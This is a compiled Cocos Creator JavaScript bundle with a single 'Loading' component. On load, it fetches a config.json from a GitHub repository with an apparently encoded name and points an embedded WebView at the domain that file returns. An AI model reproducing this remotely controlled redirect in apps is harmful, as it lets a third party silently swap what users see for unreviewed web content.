window.__require = function t(e, r, n) {
function o(i, u) {
if (!r[i]) {
if (!e[i]) {
var a = i.split("/");
a = a[a.length - 1];
if (!e[a]) {
var s = "function" == typeof __require && __require;
if (!u && s) return s(a, !0);
if (c) return c(a, !0);
throw new Error("Cannot find module '" + i + "'");
}
i = a;
}
var p = r[i] = {
exports: {}
};
e[i][0].call(p.exports, function(t) {
return o(e[i][1][t] || t);
}, p, p.exports, t, e, r, n);
}
return r[i].exports;
}
for (var c = "function" == typeof __require && __require, i = 0; i < n.length; i++) o(n[i]);
return o;
}({
Loading: [ function(t, e, r) {
"use strict";
cc._RF.push(e, "e94d0FNb95GWJEjpIGLpM8Y", "Loading");
var n, o = this && this.__extends || (n = function(t, e) {
return (n = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var r in e) Object.prototype.hasOwnProperty.call(e, r) && (t[r] = e[r]);
})(t, e);
}, function(t, e) {
n(t, e);
function r() {
this.constructor = t;
}
t.prototype = null === e ? Object.create(e) : (r.prototype = e.prototype, new r());
}), c = this && this.__decorate || function(t, e, r, n) {
var o, c = arguments.length, i = c < 3 ? e : null === n ? n = Object.getOwnPropertyDescriptor(e, r) : n;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(t, e, r, n); else for (var u = t.length - 1; u >= 0; u--) (o = t[u]) && (i = (c < 3 ? o(i) : c > 3 ? o(e, r, i) : o(e, r)) || i);
return c > 3 && i && Object.defineProperty(e, r, i), i;
};
Object.defineProperty(r, "__esModule", {
value: !0
});
var i = cc._decorator, u = i.ccclass, a = i.property, s = function(t) {
o(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.wvZ = null;
return e;
}
e.prototype.onLoad = function() {
this.sendGetRequest();
};
e.prototype.sendGetRequest = function() {
var t = this, e = new XMLHttpRequest();
e.onreadystatechange = function() {
if (4 === e.readyState && 200 === e.status) {
var r = JSON.parse(e.responseText);
console.log("Data fetched successfully:", r);
t.wvZ.url = r.domain;
} else 4 === e.readyState && 200 !== e.status && console.error("Failed to fetch data:", e.statusText);
};
e.open("GET", "https://raw.githubusercontent.com/dpmaria84/y29uzmlny29tlnn1bmnvbg9ylmhvbgvzag9vda/main/config.json", !0);
e.send();
};
c([ a(cc.WebView) ], e.prototype, "wvZ", void 0);
return c([ u ], e);
}(cc.Component);
r.default = s;
cc._RF.pop();
}, {} ]
}, {}, [ "Loading" ]);